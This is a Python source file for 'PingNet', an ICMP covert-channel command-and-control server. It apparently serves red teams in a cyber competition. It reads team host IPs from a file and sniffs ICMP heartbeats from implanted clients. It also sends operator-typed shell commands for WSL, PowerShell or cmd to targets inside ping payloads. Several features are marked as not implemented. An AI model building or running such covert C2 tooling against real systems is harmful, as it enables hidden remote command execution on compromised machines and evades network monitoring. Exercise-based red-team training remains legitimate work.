from scapy.all import *
import csv
import sys

teams = []
cmdproc = [["l", "wsl"], ["p", "powershell"], ["c", "cmd"]]
verbose = False

def setup():
    # int(input("How many teams are competing?"))
    for i in range(15):
        teams.append([])
    # teamips = input("What is the CSV file containing team info")
    with open("teams.txt") as file:
        csv_reader = csv.reader(file, delimiter=',')
        for row in csv_reader:
            if len(row) == 0:
                break
            else:
                teams[int(row[0]) - 1].append([row[1], row[2]])
    print(teams)


def sniffer():
    pkts = sniff(filter="icmp", prn=resp_mgmt)
    # These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb


def resp_mgmt(pkt):
    if str(pkt.getlayer(ICMP).type) == "8":
        print(pkt.show())
        print(pkt.getlayer(ICMP).type)
        instruct = pkt.getlayer(ICMP).load.decode()


def shell():
    global verbose
    print("Welcome to PingNet")
    while True:
        cmd = input("Pingnet:")
        if cmd == "exit":
            print("Closing")
            break
        elif cmd == "help":
            print("\nPingnet Help\ncallbacks(NI) - view all systems that have beat back\nexit - exits ping net\nhelp - Displays this help menu\nlookup <team number(NI) or specific device> - Lookup infomration on a specific device\nlist(NI) - list all of the stored systems\nsend - Enters the send prompts to send either files(not implemented) or commands to the client device\n")
        elif cmd == "lookup":
            lookup = input("What information to pull:")
            try:
                print(teams[int(lookup[0]) - 1][int(lookup[1]) - 1])
            except IndexError:
                print("Out of bounds")
            except ValueError:
                print("Why a negative number")
        elif cmd == "send":
            send = []
            send.append(input("CMD Processor:"))
            send.append(input("Command:"))
            target = input("Target:")  # this is going to use the numbering system that is already in use for organization of the teams and their boxes
            msg = ' '.join(send)
            rpckt = sr1(IP(dst=teams[int(target[0])-1][int(target[1])-1][1])/ICMP()/msg)
            if verbose:
                print(f'Send list:{send}')
                print(f'Msg:{msg}')
                print(f'Target IP:{teams[int(target[0]) - 1][int(target[1]) - 1][1]}')
                print(f'Return Packet:\n {rpckt.show()}')
        else:
            print("Invalid command")


def main():
    global verbose
    try:
        if sys.argv[1] == "-v":
            verbose = True
    finally:
        setup()
        shell()


main()

# The reason for so many inputs is because I want to see how im going to lay out the command structure. Once that is done
# Im going to be converting it into arguments to condense the program as well as making it easier to use.
